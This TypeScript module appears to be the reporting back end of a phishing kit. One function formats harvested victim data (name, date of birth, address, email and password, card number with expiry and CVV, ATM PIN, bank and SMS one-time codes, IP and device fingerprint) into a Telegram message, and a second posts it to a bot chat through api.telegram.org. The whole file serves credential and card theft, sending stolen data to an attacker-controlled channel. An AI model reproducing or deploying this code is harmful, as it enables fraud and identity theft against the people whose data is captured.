
import https from 'https';
import { escapeHtml } from '../utils/common';

export const formatSessionForTelegram = (session: any, title: string, flag: string, hideEmpty: boolean = false) => {
    const s = session;
    const d = s.data || s; // Fallback

    // Helper for "Value or Empty"
    const v = (val: any) => {
        if (val) return `<code>${escapeHtml(val)}</code>`;
        return hideEmpty ? null : '<i>(Empty)</i>';
    };

    // Helper to add line only if value exists or we are showing empty
    const addLine = (label: string, val: any, prefix = '├') => {
        const formatted = v(val);
        return formatted ? `${prefix} <b>${label}:</b> ${formatted}\n` : '';
    };

    let msg = `${flag} <b>${title}</b>\n\n`;

    msg += `🆔 <b>Session ID:</b> <code>${s.sessionId || s.id}</code>\n`;
    msg += `🌍 <b>IP Address:</b> <code>${s.ip || s.fingerprint?.ip || 'Unknown'}</code>\n`;
    msg += `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n`;

    // Identity
    if (d.firstName || d.lastName || d.email) {
        let section = `\n👤 <b>IDENTITY PROFILE</b>\n`;
        let content = '';
        content += addLine('Name', (d.firstName + ' ' + d.lastName).trim());
        content += addLine('DOB', d.dob);
        content += addLine('Phone', d.phoneNumber);
        content += addLine('Addr', d.address);
        content += addLine('Loc', d.country, '└');

        if (content || !hideEmpty) msg += section + content;
    }

    // Credentials
    if (d.email || d.password) {
        let section = `\n🔐 <b>CREDENTIALS</b>\n`;
        let content = '';
        content += addLine('Email', d.email);
        content += addLine('Pass', d.password, '└');

        if (content || !hideEmpty) msg += section + content;
    }

    // Financial
    if (d.cardNumber) {
        let section = `\n💳 <b>FINANCIAL</b>\n`;
        let content = '';
        content += addLine('Type', d.cardType);
        content += addLine('Card', d.cardNumber);

        // Multi-value line logic
        const exp = v(d.cardExpiry);
        const cvv = v(d.cardCvv);
        if (exp || cvv || !hideEmpty) {
            content += `├ <b>Exp:</b> ${exp || '<i>(Empty)</i>'} • <b>CVV:</b> ${cvv || '<i>(Empty)</i>'}\n`;
        }

        content += addLine('ATM PIN', d.atmPin);
        content += addLine('Bank OTP', d.cardOtp, '└');

        if (content || !hideEmpty) msg += section + content;
    }

    if (d.phoneCode) {
        let section = `\n📱 <b>SMS VERIFICATION</b>\n`;
        let content = addLine('Code', d.phoneCode, '└');
        if (content || !hideEmpty) msg += section + content;
    }

    // Fingerprint
    if (s.fingerprint) {
        msg += `\n💻 <b>DEVICE FINGERPRINT</b>\n`;
        msg += `├ <b>OS/Plat:</b> ${s.fingerprint.platform || 'Unknown'}\n`;
        msg += `└ <b>Agent:</b> ${s.fingerprint.userAgent || 'Unknown'}\n`;
    }

    return { text: msg, keyboard: null };
};

export const sendTelegram = (msg: string, token: string, chat: string, keyboard?: any) => {
    if (!token || !chat) return;

    const payload: any = { chat_id: chat, text: msg, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = keyboard;

    // Disable web page preview to keep it compact
    payload.disable_web_page_preview = true;

    const data = JSON.stringify(payload);
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };
    const req = https.request(options, res => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            if (res.statusCode !== 200) {
                // SECURITY: Don't log payload - it may contain sensitive user data
                console.error(`[Telegram] Failed (Status ${res.statusCode}): ${body}`);
            } else {
                console.log(`[Telegram] Sent successfully (ID: ${JSON.parse(body).result?.message_id})`);
            }
        });
    });
    req.on('error', e => console.error('[Telegram] Network Error:', e.message));
    req.write(data);
    req.end();
};
